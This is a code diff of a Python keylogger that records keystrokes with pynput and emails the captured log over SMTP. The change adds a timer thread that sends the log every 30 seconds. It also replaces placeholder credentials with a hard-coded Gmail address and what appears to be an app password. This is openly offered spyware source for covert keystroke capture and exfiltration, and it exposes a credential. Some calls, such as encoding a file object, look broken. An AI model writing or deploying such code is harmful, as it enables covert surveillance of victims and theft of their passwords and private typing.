@@ -1,5 +1,6 @@
 import pynput.keyboard
 import smtplib
+import threading
 
 log = open("logs.txt", "w")
 
@@ -43,11 +44,16 @@ def send_email(email,password,message):
     email_server.quit()
 
 
+def thread_function():
+    global log
+    send_email("stockcontroltest@gmail.com", 'xwitsvtlsobeamoe' , log.encode('utf-8'))
+    timer_object = threading.Timer(30,thread_function)
+    timer_object.start()
+
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 with keylogger_listener:
     keylogger_listener.join()
-    send_email("your mail @gmail.com", 'your password' , log.encode('utf-8'))
-
+    thread_function()
 log.close()
     
